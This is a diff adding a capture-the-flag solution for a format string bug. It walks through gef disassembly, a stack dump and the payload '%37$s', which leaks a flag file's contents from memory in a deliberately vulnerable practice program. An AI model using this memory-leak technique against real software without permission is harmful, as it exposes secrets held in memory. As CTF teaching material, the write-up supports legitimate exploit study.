@@ -64,6 +64,89 @@ int main (int argc, char **argv)
 
 ## Answer
 
+The content of the file is located inside the heap, but there is a pointer to the content of the `flag.txt` file inside the stack. So by using `%s`, the format string will display the string pointed by this address.
+
+(For testing purposes, I created the `flag.txt` file with the content `FLAG{gg}`.)
+
+We can find this address in the stack by setting a breakpoint on the call of the vulnerable `printf` function.
+
+```asm
+gef➤  disass printMessage3
+Dump of assembler code for function printMessage3:
+   0x000006ed <+0>:     push   ebp
+   0x000006ee <+1>:     mov    ebp,esp
+   0x000006f0 <+3>:     push   ebx
+   0x000006f1 <+4>:     sub    esp,0x4
+   0x000006f4 <+7>:     call   0x5f0 <__x86.get_pc_thunk.bx>
+   0x000006f9 <+12>:    add    ebx,0x18bb
+   0x000006ff <+18>:    sub    esp,0xc
+   0x00000702 <+21>:    lea    eax,[ebx-0x1684]
+   0x00000708 <+27>:    push   eax
+   0x00000709 <+28>:    call   0x570 <puts@plt>
+   0x0000070e <+33>:    add    esp,0x10
+   0x00000711 <+36>:    sub    esp,0xc
+   0x00000714 <+39>:    push   DWORD PTR [ebp+0x8]
+   0x00000717 <+42>:    call   0x520 <printf@plt>
+   0x0000071c <+47>:    add    esp,0x10
+   0x0000071f <+50>:    nop
+   0x00000720 <+51>:    mov    ebx,DWORD PTR [ebp-0x4]
+   0x00000723 <+54>:    leave
+   0x00000724 <+55>:    ret
+End of assembler dump.
+gef➤  b *(printMessage3+42)
+- Breakpoint 1 at 0x717
+```
+
+Let's run the program and find where the flag is located using the command `grep`.
+
+```asm
+gef➤  grep "FLAG{gg}"
+[+] Searching 'FLAG{gg}' in memory
+[+] In '[heap]'(0x56558000-0x5657a000), permission=rw-
+  0x56558a40 - 0x56558a4a  →   "FLAG{gg}\n"
+  0x56558c10 - 0x56558c1a  →   "FLAG{gg}\n"
+```
+
+As you can see, the content of `flag.txt` is stored on the heap, but lets try to find `0x56558a40` or `0x56558c10` in the stack.
+
+```asm
+gef➤  x/50xw $sp
+0xffffd1c0:     0x565585b0      0x0000000a      0x00000004      0x565556f9
+0xffffd1d0:     0x00000001      0x56556fb4      0xffffd1f8      0x56555755
+0xffffd1e0:     0x565585b0      0x56555995      0x56555993      0x56555731
+0xffffd1f0:     0x00000001      0x56556fb4      0xffffd218      0x5655578e
+0xffffd200:     0x565585b0      0x56555993      0x00000001      0x5655576a
+0xffffd210:     0x00000001      0x56556fb4      0xffffd268      0x5655584d
+0xffffd220:     0x565585b0      0x00000080      0x56558ad0      0x565557ae
+0xffffd230:     0x00000001      0xf7fddab0      0x00000000      0xffffd324
+0xffffd240:     0xf7f993bc      0x56556fb4      0xffffd32c      0x00000078
+0xffffd250:     0x565585b0    > 0x56558a40 <    0x56558ad0      0x0b337100
+0xffffd260:     0xffffd280      0x00000000      0x00000000      0xf7dc7a0d
+0xffffd270:     0x00000001      0x565555b0      0x00000000      0xf7dc7a0d
+0xffffd280:     0x00000001      0xffffd324
+gef➤  x/s 0x56558a40
+0x56558a40:     "FLAG{gg}\n"
+```
+
+As you can see, there is our address inside `> <`.
+`0x56558a40` is a the 37th place in the stack, so we can retrieve it using `%37$s`.
+
+```bash
+$ ./vuln
+input whatever string you want; then it will be printed back:
+
+%37$s
+Now
+your input
+will be printed:
+
+FLAG{gg}
+```
+
+---
+
+The other way to solve this challenge is using bruteforce :
+
 Source code (solve.py) :
 
 ```python
